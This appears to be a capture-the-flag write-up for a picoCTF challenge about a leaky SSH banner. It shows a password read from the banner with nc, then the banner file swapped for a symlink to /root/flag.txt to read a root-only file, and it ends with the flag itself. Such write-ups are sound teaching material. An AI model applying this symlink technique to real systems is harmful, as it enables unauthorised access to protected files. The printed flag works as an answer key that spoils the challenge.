
###### Descripción:
Can you abuse the banner?

The server has been leaking some crucial information on `tethys.picoctf.net 55383. Use the leaked information to get to the server.

To connect to the running application use nc tethys.picoctf.net 55460. From the above information abuse the machine and find the flag in the /root directory.


###### Pistas:

-Do you know about symlinks?
-Maybe some small password cracking or guessing



**Solución 1**

```
En kali linux:

──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 55383 
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 55460 
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234


What is the top cyber security conference in the world?
DEFCON


the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper


player@challenge:~$ rm /home/player/banner
rm /home/player/banner

player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C
                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 55460
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password? 


```


## Respuesta: **picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}**
